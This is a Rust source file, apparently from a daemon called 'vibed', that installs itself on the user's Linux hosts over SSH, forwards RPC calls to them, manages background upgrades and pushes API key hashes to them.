//! Linux hosts, as the Mac's `vibed` sees them (PRD: Linux hosts). It installs `vibed` on one over SSH, keeps a link to
//! it, and from then on a call that names the host goes to the host's own
//! `vibed` over that link, and its answer comes back under the host's
//! name. The host's events join this one's stream, its agents join the
//! menu and MCP, and the API keys made here are pushed to it, so one key
//! works everywhere. Transcripts stay on the host.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use serde_json::{Value, json};
use vibe_core::model::{
    AdminNeed, AgentState, EventKind, HostLink, LOCAL_HOST, TunnelState, validate_host_name,
    validate_ref, validate_ssh_destination,
};
use vibe_core::rpc::{
    Agent, AgentList, AgentsList, ApiKey, ErrorCode, ErrorObject, HostAddParams, HostAdmin,
    HostInfo, HostInstall, HostList, HostNameParams, HostRemoveParams, KeyList, KeySyncParams,
    KeysList, KeysSync, Method, NoParams,
};
use vibe_core::time::parse_rfc3339;

use crate::core::{Core, error, invalid, lock, store_error};

/// How long a connected host has to say when keys were last used there.
const KEYS_ASK: Duration = Duration::from_secs(3);
use std::sync::atomic::Ordering;

use crate::link::Link;
use crate::remote::{Installed, Remote, TOOLS};

/// The methods that act on one host, by its `host` param, and so go to a
/// Linux host's `vibed` when they name one.
pub const FORWARDED: &[&str] = &[
    "projects.list",
    "projects.add",
    "projects.remove",
    "profiles.list",
    "profiles.create",
    "profiles.update",
    "profiles.delete",
    "limits.get",
    "limits.set",
    "mcp.get",
    "mcp.set",
    // How a host stands with a service, and its own settings for it, go to it.
    // A sign-in starts on the host that's to own the login. `services.complete`
    // and `services.disconnect` also go to a host, but aren't here as there's more
    // to them on this side: see `Core::services_complete`. `services.token` and
    // `services.follow` are only ever sent, never forwarded.
    "services.list",
    "services.connect",
    "services.set",
    "services.audit",
    "sessions.list",
    "sessions.attach",
    "agents.start",
    "agents.list",
    "agents.delete",
    "agents.interrupt",
    "agents.send",
    "agents.check",
    "agents.output",
    "agents.messages",
    "signin.start",
    "signin.get",
    "signin.answer",
    "signin.cancel",
    "pi.status",
    "pi.install",
    "pi.forget",
    "pi.models",
    "pi.login.start",
    "pi.login.get",
    "pi.login.answer",
    "pi.login.cancel",
];

/// How long a forwarded call may take. Starting an agent fetches, cuts a
/// worktree and runs `.vibe/setup.sh`, and adding a project may clone a
/// big repo, and removing one on a Linux host may delete it: those get as
/// long as they need here, within reason. A send may wake an agent first.
pub(crate) fn call_timeout(method: &str) -> Duration {
    match method {
        // The Pi for a list or a sign-in may have to be got first.
        "agents.start" | "projects.add" | "projects.remove" | "agents.delete" | "pi.install"
        | "pi.models" | "pi.login.start" => Duration::from_secs(60 * 60),
        "agents.send" | "sessions.attach" => Duration::from_secs(5 * 60),
        _ => Duration::from_secs(2 * 60),
    }
}

/// Rewrites what a host said about itself as this host says it: its
/// `local` becomes its name, and an agent's attach line is the one that
/// reaches it from here, over SSH.
fn relabel(value: &mut Value, link: &Link, remote: &dyn Remote) {
    match value {
        Value::Object(map) => {
            // Whatever it calls itself, it's this host's `link.name`: a host
            // can't put rows under another's name.
            if map.contains_key("host") {
                map.insert("host".into(), json!(link.name));
            }
            if map.contains_key("attach")
                && let Some(agent) = map.get("ref").and_then(Value::as_str)
            {
                let line = remote.attach_line(&link.address, agent);
                map.insert("attach".into(), json!(line));
            }
            for v in map.values_mut() {
                relabel(v, link, remote);
            }
        }
        Value::Array(items) => {
            // An agent whose ref no vibed would make is left out: its ref
            // goes into lines this Mac runs.
            items.retain(|v| match (v.get("attach"), v.get("ref")) {
                (Some(_), Some(r)) => r.as_str().is_some_and(|r| validate_ref(r).is_ok()),
                _ => true,
            });
            items.iter_mut().for_each(|v| relabel(v, link, remote));
        }
        _ => {}
    }
}

/// An error a host answered with, under its name.
fn relabel_error(mut e: ErrorObject, link: &Link) -> ErrorObject {
    e.message = e
        .message
        .replace(&format!(" on {LOCAL_HOST}"), &format!(" on {}", link.name));
    e
}

impl Core {
    /// The links, one per Linux host, from the registry.
    pub(crate) fn load_links(&self) -> Result<(), ErrorObject> {
        let hosts = self.store().hosts().map_err(store_error)?;
        let mut links = lock(&self.links);
        for h in hosts {
            if let Some(address) = &h.address {
                links
                    .entry(h.name.clone())
                    .or_insert_with(|| Arc::new(Link::new(&h.name, address)));
            }
        }
        Ok(())
    }

    /// The link to the Linux host `name`, if it's one.
    pub fn link(&self, name: &str) -> Option<Arc<Link>> {
        lock(&self.links).get(name).cloned()
    }

    /// The link a call's params name, if they name a Linux host.
    pub(crate) fn link_for(&self, params: Option<&Value>) -> Option<Arc<Link>> {
        let host = params?.get("host")?.as_str()?;
        if host == LOCAL_HOST {
            return None;
        }
        self.link(host)
    }

    // hosts.list

    pub fn hosts(&self) -> Result<HostList, ErrorObject> {
        let mut hosts = self.store().hosts().map_err(store_error)?;
        let serving = self.mcp_serving.load(std::sync::atomic::Ordering::SeqCst);
        for h in hosts.iter_mut() {
            if h.link == HostLink::Local {
                h.mcp = serving;
                h.version = Some(self.info().version.clone());
                h.missing = self.missing_tools();
                h.memory = self.memory_use();
                h.needs_admin = self.admin_needs();
                h.sign_ins = self.sign_ins_needed();
                // Whether a Mac answers through its tunnel, once one has opened one.
                if let Some(mac) = self.mac() {
                    h.tunnel = Some(if mac.is_up() {
                        TunnelState::Up
                    } else {
                        TunnelState::Down
                    });
                }
            } else if let Some(link) = self.link(&h.name) {
                *h = link.describe(h.clone());
                if let Some(own) = link.reported() {
                    h.memory = own.memory;
                    h.needs_admin = own.needs_admin;
                    h.sign_ins = own.sign_ins;
                }
                let upgrade = lock(&link.upgrade);
                h.upgrade_error.clone_from(&upgrade.error);
                h.upgrade_held = upgrade.held;
                if h.link == HostLink::Down {
                    if upgrade.running {
                        h.detail = Some("VibeOS is upgrading its vibed".to_owned());
                    } else if let Some(why) = &upgrade.error {
                        h.detail = Some(format!("VibeOS can't upgrade its vibed: {why}"));
                    }
                }
                drop(upgrade);
                if let Some(view) = self.tunnel_view(&h.name) {
                    h.tunnel = Some(view.state);
                    h.tunnel_detail = view.detail;
                }
            }
        }
        Ok(HostList { hosts })
    }

    /// What this host lacks of the tools its agents need, if it's a Linux
    /// host; on a Mac the setup's doctor checks them (#14).
    fn missing_tools(&self) -> Vec<String> {
        if self.info().os != "linux" {
            return Vec::new();
        }
        let path = std::env::var_os("PATH");
        let home = self.layout.home();
        TOOLS
            .iter()
            .filter(|t| crate::core::find_tool(t, path.as_deref(), Some(home)).is_none())
            .map(|t| (*t).to_owned())
            .collect()
    }

    /// What this host still needs signing in to, as far as it can cheaply tell, as
    /// `hosts.list` is asked with every ping: `gh`'s login as its hourly check last
    /// found, and Claude Code's as last looked at. Not one that isn't here yet: there's
    /// nothing to sign in with.
    fn sign_ins_needed(&self) -> Vec<vibe_core::model::SignInWhat> {
        use vibe_core::model::{GhState, SignInWhat};
        let mut needed = Vec::new();
        if lock(&self.gh_status).state == GhState::LoggedOut {
            needed.push(SignInWhat::Github);
        }
        if self.claude_signed_out.load(Ordering::SeqCst) {
            needed.push(SignInWhat::Claude);
        }
        needed
    }

    /// What this host needs `sudo` for, which VibeOS has tried everything else for.
    /// Only a look at a file: `hosts.list` is asked with every ping.
    fn admin_needs(&self) -> Vec<AdminNeed> {
        let mut needs = Vec::new();
        if self.checks.linger() == Ok(Some(false)) {
            needs.push(AdminNeed::Linger);
        }
        if self.git_waits_for_admin() {
            needs.push(AdminNeed::Git);
        }
        needs
    }

    /// `hosts.admin`: the line that does, over SSH, what a Linux host needs `sudo`
    /// for, with its password asked for there, on the terminal it runs in. It comes
    /// from this side's list of what each need takes: the host only says which it
    /// has, so a host can't have this Mac run anything else. With its link down it
    /// goes by what it last said: SSH may well still reach it.
    pub fn host_admin(&self, p: HostNameParams) -> Result<HostAdmin, ErrorObject> {
        let link = self.linux_host(&p.host)?;
        let needs = self.host_info(&p.host)?.needs_admin;
        if needs.is_empty() {
            return Err(error(
                ErrorCode::Conflict,
                format!("{} needs nothing of the kind now", p.host),
            ));
        }
        Ok(HostAdmin {
            command: self.remote.admin_line(&link.address, &needs),
        })
    }

    pub(crate) fn host_info(&self, name: &str) -> Result<HostInfo, ErrorObject> {
        self.hosts()?
            .hosts
            .into_iter()
            .find(|h| h.name == name)
            .ok_or_else(|| error(ErrorCode::NotFound, format!("no host named {name}")))
    }

    // hosts.add, hosts.upgrade, hosts.remove

    /// Add Linux host…: installs `vibed` over SSH, records the host, and
    /// starts its link.
    pub async fn add_host(&self, p: HostAddParams) -> Result<HostInstall, ErrorObject> {
        validate_host_name(&p.name).map_err(invalid)?;
        validate_ssh_destination(&p.address).map_err(invalid)?;
        let taken = || {
            error(
                ErrorCode::Conflict,
                format!("a host named {} already exists", p.name),
            )
        };
        if self.store().has_host(&p.name).map_err(store_error)? {
            return Err(taken());
        }
        if !lock(&self.adding_hosts).insert(p.name.clone()) {
            return Err(error(
                ErrorCode::Conflict,
                format!("{} is being added already", p.name),
            ));
        }
        let result = self.install_new_host(&p).await;
        lock(&self.adding_hosts).remove(&p.name);
        result
    }

    async fn install_new_host(&self, p: &HostAddParams) -> Result<HostInstall, ErrorObject> {
        crate::log!(
            "vibed: adding {} at {}: installing vibed over SSH",
            p.name,
            p.address
        );
        let installed = self.install_on(&p.name, &p.address).await?;
        let info = HostInfo {
            name: p.name.clone(),
            os: installed.os.clone(),
            label: installed.label.clone(),
            link: HostLink::Down,
            external: false,
            mcp: false,
            address: Some(p.address.clone()),
            version: Some(installed.version.clone()),
            missing: installed.missing.clone(),
            detail: None,
            tunnel: None,
            tunnel_detail: None,
            memory: None,
            needs_admin: installed.needs_admin.clone(),
            upgrade_error: None,
            upgrade_held: false,
            sign_ins: Vec::new(),
        };
        self.store()
            .add_host(&info, self.now())
            .map_err(store_error)?;
        let link = Arc::new(Link::new(&p.name, &p.address));
        lock(&self.links).insert(p.name.clone(), Arc::clone(&link));
        self.start_link(&link);
        self.sync_tunnel();
        crate::log!(
            "vibed: added {} ({}, vibed {}{})",
            p.name,
            installed.label,
            installed.version,
            if installed.missing.is_empty() {
                String::new()
            } else {
                format!("; missing {}", installed.missing.join(", "))
            }
        );
        let mut e = self.event(EventKind::HostAdded);
        e.host = p.name.clone();
        self.publish(e);
        Ok(HostInstall {
            host: link.describe(info),
            changed: installed.changed,
            notes: installed.notes,
        })
    }

    async fn install_on(&self, name: &str, address: &str) -> Result<Installed, ErrorObject> {
        self.remote.install(address).await.map_err(|e| {
            crate::log!("vibed: installing vibed on {name} failed: {e}");
            error(ErrorCode::CommandFailed, e)
        })
    }

    /// Installs this build's `vibed` on a host added already, and checks its tools
    /// again, now. It happens by itself; this is **Retry**, for one that failed.
    pub async fn upgrade_host(&self, p: HostNameParams) -> Result<HostInstall, ErrorObject> {
        let link = self.linux_host(&p.host)?;
        if self.host_is_newer(&link) {
            return Err(error(
                ErrorCode::Conflict,
                format!(
                    "{} runs a newer vibed than this Mac, so it's left as it is: update VibeOS \
                     on this Mac",
                    link.name
                ),
            ));
        }
        {
            let mut upgrade = lock(&link.upgrade);
            upgrade.running = true;
            // Someone's chosen, which is all a hold was waiting for.
            upgrade.held = false;
            upgrade.tried_at = Some(std::time::Instant::now());
            upgrade.reconnected = false;
        }
        let installed = self.upgrade_now(&link).await?;
        Ok(HostInstall {
            host: self.host_info(&link.name)?,
            changed: installed.changed,
            notes: installed.notes,
        })
    }

    /// One install on `link`'s host, the next in line, and how it went for
    /// [`Link::upgrade`]. Agents there keep running: their shims are out of reach
    /// of the restart (PRD: Restarts).
    async fn upgrade_now(&self, link: &Arc<Link>) -> Result<Installed, ErrorObject> {
        let done = {
            let _one_at_a_time = link.installing.lock().await;
            self.install_on(&link.name, &link.address).await
        };
        let mine = self.info().version.clone();
        // A build older than this Mac's can't put right that it's behind.
        let done = done.and_then(|installed| {
            if older(&installed.version, &mine) {
                let why = format!(
                    "this VibeOS's build for it is vibed {}, older than this Mac's {mine}",
                    installed.version
                );
                let _ = self.record_install(link, &installed);
                Err(error(ErrorCode::CommandFailed, why))
            } else {
                Ok(installed)
            }
        });
        // Settled before anyone's told, so the row they read is as it stands now.
        let left_on = self.store().host(&link.name).ok().and_then(|h| h.version);
        {
            let mut upgrade = lock(&link.upgrade);
            upgrade.running = false;
            upgrade.error = done.as_ref().err().map(|e| e.message.clone());
            upgrade.went_back_to = left_on.filter(|_| {
                done.as_ref()
                    .is_err_and(|e| e.message.contains(crate::remote::WENT_BACK))
            });
            // It worked, and no link's coming up to say so: nothing holds off the next.
            if done.is_ok() && link.connected() {
                upgrade.tried_at = None;
                upgrade.reconnected = false;
            }
        }
        let done = done.and_then(|installed| {
            self.record_install(link, &installed)?;
            Ok(installed)
        });
        if let Err(e) = &done {
            lock(&link.upgrade).error = Some(e.message.clone());
            self.host_link_changed(link);
        }
        done
    }

    /// Whether `link`'s host last said it runs a newer `vibed` than this one. A newer
    /// `vibed`'s registry is one an older one can't read, so nothing here ever installs
    /// over it: it would leave the host unable to start.
    fn host_is_newer(&self, link: &Link) -> bool {
        self.store()
            .host(&link.name)
            .ok()
            .and_then(|h| h.version)
            .is_some_and(|v| older(&self.info().version, &v))
    }

    fn record_install(&self, link: &Arc<Link>, installed: &Installed) -> Result<(), ErrorObject> {
        let mut info = self.store().host(&link.name).map_err(store_error)?;
        info.os = installed.os.clone();
        info.label = installed.label.clone();
        info.version = Some(installed.version.clone());
        info.missing = installed.missing.clone();
        info.needs_admin = installed.needs_admin.clone();
        self.store().set_host_report(&info).map_err(store_error)?;
        link.behind.store(
            older(&installed.version, &self.info().version),
            Ordering::SeqCst,
        );
        crate::log!(
            "vibed: {} runs vibed {}{}",
            link.name,
            installed.version,
            if installed.changed {
                ", just installed"
            } else {
                " already"
            }
        );
        self.host_link_changed(link);
        // A restarted vibed there dropped the link; take it up again now.
        link.kick();
        Ok(())
    }

    /// Forgets a Linux host. It runs on there, on its own.
    pub async fn remove_host(&self, p: HostRemoveParams) -> Result<HostInfo, ErrorObject> {
        let link = self.linux_host(&p.host)?;
        let info = self.host_info(&p.host)?;
        // It may still serve publicly, on a build from before External Address was retired,
        // with the keys this Mac pushed. Forgotten with those still there, a revoke here
        // could never reach it, so it has to be told first. If it's gone for good, `force`
        // says that's understood.
        let public = link.reported().is_some_and(|own| own.external)
            || self
                .store()
                .host_had_external(&p.host)
                .map_err(store_error)?;
        let force = p.force == Some(true);
        let cant_tell = |why: String| {
            error(
                ErrorCode::Conflict,
                format!(
                    "{} may still serve publicly with this Mac's API keys and {why}, so they'd go \
                     on working there: remove it once it's back. If it's gone for good, remove \
                     it anyway, and revoke them on the host with vibe key revoke if it ever \
                     comes back",
                    p.host
                ),
            )
        };
        if public && !link.connected() {
            if !force {
                return Err(cant_tell("its link is down".into()));
            }
            crate::log!(
                "vibed: {} forgotten with its link down, as asked: it may go on serving publicly \
                 with this Mac's API keys until they're revoked there",
                p.host
            );
        }
        // The keys this Mac pushed there stop working there: once it's
        // forgotten, a revoke here would never reach it.
        let from = self.install_id()?;
        if link.connected()
            && let Err(e) = self
                .forward_typed::<KeysSync>(
                    &link,
                    &KeySyncParams {
                        keys: Vec::new(),
                        from: Some(from),
                    },
                )
                .await
        {
            if public && !force {
                return Err(cant_tell(format!(
                    "it wouldn't take them off: {}",
                    e.message
                )));
            }
            crate::log!(
                "vibed: can't take this Mac's keys off {}: {}; revoke them there with vibe key",
                link.name,
                e.message
            );
        }
        self.close_tunnel_to(&link).await;
        self.services_host_leaving(&p.host).await;
        self.store().remove_host(&p.host).map_err(store_error)?;
        lock(&self.links).remove(&p.host);
        self.services_wake.notify_one();
        link.stop();
        crate::log!(
            "vibed: removed {}; its vibed and agents run on there, on their own",
            p.host
        );
        let mut e = self.event(EventKind::HostRemoved);
        e.host = p.host.clone();
        self.publish(e);
        Ok(info)
    }

    /// What to tell whoever had External Address on, now it's retired (#143), if
    /// anything's left of it here. Nothing is removed: the registry's row is what a
    /// build that's gone back to the one before reads, and the rest is the owner's to
    /// clear, as docs/mcp-and-networking.md says.
    pub fn retired_external_note(&self) -> Option<String> {
        let domains = self
            .store()
            .retired_external_domains()
            .unwrap_or_default()
            .join(", ");
        let certs = self.layout.data_dir().join("external");
        if domains.is_empty() && !certs.exists() {
            return None;
        }
        let was = if domains.is_empty() {
            String::new()
        } else {
            format!(" (it was {domains})")
        };
        let left = if certs.exists() {
            format!(
                " Its certificate and keys are still in {}.",
                certs.display()
            )
        } else {
            String::new()
        };
        Some(format!(
            "External Address is retired{was}: this vibed serves no public HTTPS. MCP is on \
             loopback, and on Tailscale if mcp_tailscale is on.{left} \
             Nothing was removed: see the migration notes in docs/mcp-and-networking.md"
        ))
    }

    pub(crate) fn linux_host(&self, name: &str) -> Result<Arc<Link>, ErrorObject> {
        if name == LOCAL_HOST {
            return Err(invalid(format!(
                "{LOCAL_HOST} is this host; name a Linux host added to it"
            )));
        }
        self.link(name)
            .ok_or_else(|| error(ErrorCode::NotFound, format!("no host named {name}")))
    }

    // Forwarding.

    /// Calls `method` on `link`'s host with `params`, less their `host`,
    /// and gives its answer as this host says it.
    pub async fn forward(
        &self,
        link: &Link,
        method: &str,
        mut params: Value,
    ) -> Result<Value, ErrorObject> {
        if let Some(map) = params.as_object_mut() {
            map.remove("host");
        }
        let mut value = link
            .call(self, method, params, call_timeout(method))
            .await
            .map_err(|e| relabel_error(e, link))?;
        relabel(&mut value, link, &*self.remote);
        Ok(value)
    }

    /// [`Core::forward`], typed.
    pub async fn forward_typed<M: Method>(
        &self,
        link: &Link,
        params: &M::Params,
    ) -> Result<M::Result, ErrorObject> {
        let params = serde_json::to_value(params)
            .map_err(|e| error(ErrorCode::InternalError, format!("Internal error: {e}")))?;
        let value = self.forward(link, M::NAME, params).await?;
        serde_json::from_value(value).map_err(|e| {
            error(
                ErrorCode::InternalError,
                format!(
                    "Internal error: {} answered {} with something unexpected: {e}",
                    link.name,
                    M::NAME
                ),
            )
        })
    }

    /// A Linux host's agents: as it lists them now while its link is up,
    /// or as it last listed them while it's down.
    pub async fn remote_agents(&self, link: &Link) -> Vec<Agent> {
        if link.connected() {
            match self
                .forward_typed::<AgentsList>(link, &Default::default())
                .await
            {
                Ok(list) => {
                    self.keep_agents(link, &list.agents);
                    return list.agents;
                }
                Err(e) => crate::log!("vibed: can't list {}'s agents: {}", link.name, e.message),
            }
        }
        self.kept_agents(link)
    }

    pub(crate) fn kept_agents(&self, link: &Link) -> Vec<Agent> {
        let kept = self.store().host_agents(&link.name).unwrap_or_default();
        serde_json::from_str::<Vec<Agent>>(&kept).unwrap_or_default()
    }

    fn keep_agents(&self, link: &Link, agents: &[Agent]) {
        let json = serde_json::to_string(agents).expect("agents serialize");
        if let Err(e) = self.store().set_host_agents(&link.name, &json) {
            crate::log!("vibed: can't keep {}'s agents: {e}", link.name);
        }
    }

    /// Adds an agent to those kept of `link`'s host, as its start just said, so a
    /// bare ref finds it before the event's refresh does.
    pub(crate) fn note_kept_agent(&self, link: &Link, agent: &Agent) {
        let mut agents = self.kept_agents(link);
        agents.retain(|a| a.agent != agent.agent);
        agents.push(agent.clone());
        self.keep_agents(link, &agents);
    }

    /// Takes an agent from those kept of `link`'s host, as its delete just said.
    pub(crate) fn forget_kept_agent(&self, link: &Link, agent: &str) {
        let mut agents = self.kept_agents(link);
        agents.retain(|a| a.agent != agent);
        self.keep_agents(link, &agents);
    }

    /// Changes one kept agent of `link`'s host, as an event says.
    fn change_kept_agent(&self, link: &Link, agent: &str, change: impl FnOnce(&mut Agent)) {
        let mut agents = self.kept_agents(link);
        if let Some(a) = agents.iter_mut().find(|a| a.agent == agent) {
            change(a);
            self.keep_agents(link, &agents);
        }
    }

    /// Reads `link`'s host's agents again, in the background.
    /// Reads `link`'s host's agents again, in the background: one read at
    /// a time, and one more after it for any asked for meanwhile, however
    /// many events asked.
    fn refresh_agents(&self, link: &Arc<Link>) {
        if link.refresh_wanted.swap(true, Ordering::SeqCst) {
            return;
        }
        let link = Arc::clone(link);
        self.in_background(|core| async move {
            while link.refresh_wanted.swap(false, Ordering::SeqCst) {
                core.remote_agents(&link).await;
            }
        });
    }

    // What links tell the core.

    /// What a host said of itself as its link came up: its OS, hostname,
    /// version and missing tools.
    pub(crate) fn host_reported(
        &self,
        link: &Link,
        own: Option<&HostInfo>,
        version: Option<String>,
    ) {
        let Ok(mut info) = self.store().host(&link.name) else {
            return;
        };
        let before = info.clone();
        if let Some(own) = own {
            info.os = own.os.clone();
            info.label = own.label.clone();
            info.missing = own.missing.clone();
            info.needs_admin = own.needs_admin.clone();
            if let Err(e) = self.store().note_host_external(&link.name, own.external) {
                crate::log!("vibed: can't record what {} said: {e}", link.name);
            }
        }
        if version.is_some() {
            info.version = version;
        }
        if info != before
            && let Err(e) = self.store().set_host_report(&info)
        {
            crate::log!("vibed: can't record what {} said: {e}", link.name);
        }
    }

    /// Publishes a `host.link` event: `link`'s state or report changed.
    pub(crate) fn host_link_changed(&self, link: &Link) {
        let mut e = self.event(EventKind::HostLink);
        e.host = link.name.clone();
        let info = link.describe(HostInfo {
            name: link.name.clone(),
            os: String::new(),
            label: String::new(),
            link: HostLink::Down,
            external: false,
            mcp: false,
            address: None,
            version: None,
            missing: Vec::new(),
            detail: None,
            tunnel: None,
            tunnel_detail: None,
            memory: None,
            needs_admin: Vec::new(),
            upgrade_error: None,
            upgrade_held: false,
            sign_ins: Vec::new(),
        });
        e.state = Some(info.link.to_string());
        e.message = info.detail;
        self.publish(e);
    }

    /// What follows a link coming up: the host's agents read again, this
    /// host's keys pushed to it, and an upgrade if it runs another `vibed`.
    pub(crate) fn link_came_up(&self, link: &Arc<Link>) {
        self.services_wake.notify_one();
        self.refresh_agents(link);
        self.push_keys_to(link);
        let theirs = self.store().host(&link.name).ok().and_then(|h| h.version);
        // Only up: a newer vibed's registry is one an older one can't read.
        let behind = theirs
            .as_deref()
            .is_some_and(|v| older(v, &self.info().version));
        link.behind.store(behind, Ordering::SeqCst);
        if behind {
            // A try the network cut short needn't wait out the hour. One whose build
            // wouldn't start does: a reconnect makes it no better, and each try cuts
            // the host off for half a minute.
            {
                let mut upgrade = lock(&link.upgrade);
                let bad_build = upgrade.went_back_to.is_some() && upgrade.went_back_to == theirs;
                upgrade.reconnected = !bad_build;
            }
            self.upgrade_in_background(link);
        } else {
            // It's what it should be, however that came about: nothing's left to say.
            // Unless a try is under way, which this says nothing about, or this is what a
            // build that wouldn't start went back to. Forgetting that would let the next
            // look that finds no `vibed` put the same bad build straight back.
            let had = {
                let mut upgrade = lock(&link.upgrade);
                let bad_build = upgrade.went_back_to.is_some() && upgrade.went_back_to == theirs;
                if upgrade.running || bad_build {
                    false
                } else {
                    upgrade.tried_at = None;
                    upgrade.reconnected = false;
                    upgrade.went_back_to = None;
                    upgrade.held = false;
                    upgrade.error.take().is_some()
                }
            };
            if had {
                self.host_link_changed(link);
            }
        }
    }

    /// Installs this build on `link`'s host, with nobody asked, as when it runs an
    /// older version, speaks an older protocol or has no `vibed` to talk to: unless
    /// that's under way, or too soon after the last try, however that went, or the host
    /// runs a newer one, or may still serve External Address, which this build would end
    /// ([`Self::upgrade_hold`]). What went wrong shows in its row, with **Retry**.
    pub fn upgrade_in_background(&self, link: &Arc<Link>) {
        if self.host_is_newer(link) {
            return;
        }
        if let Some(why) = self.upgrade_hold(link) {
            let changed = {
                let mut upgrade = lock(&link.upgrade);
                if upgrade.running {
                    return;
                }
                let changed = !upgrade.held || upgrade.error.as_deref() != Some(why.as_str());
                upgrade.held = true;
                upgrade.error = Some(why.clone());
                changed
            };
            if changed {
                crate::log!("vibed: not upgrading {}: {why}", link.name);
                self.host_link_changed(link);
            }
            return;
        }
        {
            let mut upgrade = lock(&link.upgrade);
            if upgrade.held {
                upgrade.held = false;
                upgrade.error = None;
            }
            if upgrade.running || upgrade.too_soon(&self.link_timing) {
                return;
            }
            upgrade.running = true;
            upgrade.tried_at = Some(std::time::Instant::now());
            upgrade.reconnected = false;
        }
        let link = Arc::clone(link);
        self.in_background(|core| async move {
            crate::log!(
                "vibed: {} needs this vibed ({}); upgrading it",
                link.name,
                core.info().version
            );
            if let Err(e) = core.upgrade_now(&link).await {
                crate::log!("vibed: can't upgrade {}: {}", link.name, e.message);
            }
        });
    }

    /// Why `link`'s host mustn't be upgraded with nobody asked, if it mustn't: upgrading a
    /// host still on a build from before External Address was retired (#143) would end
    /// what its clients reach it by, with no one told. Nothing's known to say it's safe
    /// counts as not safe, but for a host with no link to say anything, which has no
    /// `vibed` to speak of and nothing on record.
    fn upgrade_hold(&self, link: &Link) -> Option<String> {
        let name = &link.name;
        let serving = format!(
            "{name} still serves External Address on an older vibed, and updating it would end \
             that, so it isn't updated by itself. Move its MCP clients, then update it from \
             Settings → Hosts or with vibe host upgrade {name}"
        );
        let unknown = format!(
            "VibeOS can't tell whether {name} still serves External Address, which updating it \
             would end, so it isn't updated by itself. Update it from Settings → Hosts or with \
             vibe host upgrade {name} if nothing depends on that"
        );
        if let Some(own) = link.reported() {
            return own.external.then_some(serving);
        }
        match self.store().host_had_external(name) {
            Ok(true) => Some(serving),
            Ok(false) if link.connected() => Some(unknown),
            Ok(false) => None,
            Err(e) => {
                crate::log!("vibed: can't read what's recorded of {name}: {e}");
                Some(unknown)
            }
        }
    }

    /// The link's still finding no `vibed`, with nothing under way to put that right
    /// for now: an install that went well didn't. That's said, not left to look fine.
    pub(crate) fn note_still_missing(&self, link: &Link, why: &str) {
        let mut upgrade = lock(&link.upgrade);
        if !upgrade.running && upgrade.tried_at.is_some() && upgrade.error.is_none() {
            upgrade.error = Some(why.to_owned());
        }
    }

    /// An event from `link`'s host, onto this host's stream under its name.
    pub(crate) fn remote_event(&self, link: &Arc<Link>, params: Value) {
        let Some(event) = crate::link::relabel_event(&link.name, params) else {
            return;
        };
        match event.kind {
            // A host's own hosts aren't this one's.
            EventKind::HostAdded | EventKind::HostRemoved | EventKind::HostLink => return,
            EventKind::AgentState => {
                if let (Some(agent), Some(state)) = (&event.agent, &event.state)
                    && let Ok(state) = state.parse::<AgentState>()
                {
                    self.change_kept_agent(link, agent, |a| a.state = state);
                }
            }
            EventKind::AgentStatus => {
                if let (Some(agent), Some(status)) = (&event.agent, &event.status) {
                    let status = status.clone();
                    self.change_kept_agent(link, agent, |a| a.status = status);
                }
            }
            EventKind::AgentAdded | EventKind::AgentDeleted | EventKind::Lagged => {
                self.refresh_agents(link);
            }
            // A refresh there, or a follower wanting a token.
            EventKind::ServiceChanged => self.services_wake.notify_one(),
            _ => {}
        }
        self.publish(event);
    }

    // API keys.

    /// Pushes this host's keys, by their hashes, to every Linux host whose
    /// link is up, as after a key is made or revoked.
    pub(crate) fn push_keys(&self) {
        let links: Vec<Arc<Link>> = lock(&self.links).values().cloned().collect();
        for link in &links {
            if link.connected() {
                self.push_keys_to(link);
            } else {
                // It gets them when it's back; until then the list says it hasn't.
                link.keys_stale.store(true, Ordering::SeqCst);
            }
        }
    }

    pub(crate) fn push_keys_to(&self, link: &Arc<Link>) {
        let link = Arc::clone(link);
        self.in_background(|core| async move {
            // Waits its turn, then reads the list, so the last to go is the latest.
            let _one_at_a_time = link.keys_pushing.lock().await;
            let keys = core.store().key_hashes();
            let (keys, from) = match (keys, core.install_id()) {
                (Ok(keys), Ok(from)) => (keys, from),
                (Err(e), _) => {
                    crate::log!("vibed: can't read the keys to push: {e}");
                    link.keys_stale.store(true, Ordering::SeqCst);
                    return;
                }
                (_, Err(e)) => {
                    crate::log!(
                        "vibed: can't say which Mac the keys are from: {}",
                        e.message
                    );
                    link.keys_stale.store(true, Ordering::SeqCst);
                    return;
                }
            };
            let n = keys.len();
            match core
                .forward_typed::<KeysSync>(
                    &link,
                    &KeySyncParams {
                        keys,
                        from: Some(from),
                    },
                )
                .await
            {
                Ok(there) => {
                    core.note_key_uses(&link.name, &there.keys);
                    link.keys_stale.store(false, Ordering::SeqCst);
                    crate::log!(
                        "vibed: pushed {n} API key{} to {}",
                        if n == 1 { "" } else { "s" },
                        link.name
                    );
                }
                Err(e) => {
                    // The next ping tries again.
                    link.keys_stale.store(true, Ordering::SeqCst);
                    crate::log!(
                        "vibed: can't push the API keys to {}: {}",
                        link.name,
                        e.message
                    );
                }
            }
        });
    }

    /// `keys.list`: every key, with when it was last used anywhere. A key
    /// made here and pushed to Linux hosts is used there too, where the
    /// host records it; each connected host is asked, and what it saw is
    /// kept here, so the time stands while the host is away.
    pub async fn keys_everywhere(&self) -> Result<KeyList, ErrorObject> {
        let links: Vec<Arc<Link>> = lock(&self.links)
            .values()
            .filter(|l| l.connected())
            .cloned()
            .collect();
        // All at once, each given the same few seconds: connected hosts
        // answer at once, and one that doesn't is let go. Links run only
        // where this core knows itself, as an `Arc`.
        if let Some(core) = self.me.get().and_then(std::sync::Weak::upgrade) {
            let mut asked = tokio::task::JoinSet::new();
            for link in links {
                let core = Arc::clone(&core);
                asked.spawn(async move { core.ask_key_uses(&link).await });
            }
            asked.join_all().await;
        } else {
            for link in links {
                self.ask_key_uses(&link).await;
            }
        }
        let mut list = self.keys()?;
        list.pending_on = lock(&self.links)
            .values()
            .filter(|l| l.keys_stale.load(Ordering::SeqCst))
            .map(|l| l.name.clone())
            .collect();
        list.pending_on.sort();
        Ok(list)
    }

    /// Asks `link`'s host when the keys pushed to it were last used there,
    /// for [`KEYS_ASK`] at most, and keeps what it says.
    async fn ask_key_uses(&self, link: &Link) {
        let there =
            tokio::time::timeout(KEYS_ASK, self.forward_typed::<KeysList>(link, &NoParams {}))
                .await;
        match there {
            Ok(Ok(there)) => self.note_key_uses(&link.name, &there.keys),
            Ok(Err(e)) => crate::log!(
                "vibed: can't ask {} when keys were last used: {}",
                link.name,
                e.message
            ),
            Err(_) => crate::log!(
                "vibed: {} didn't say when keys were last used in {}s",
                link.name,
                KEYS_ASK.as_secs()
            ),
        }
    }
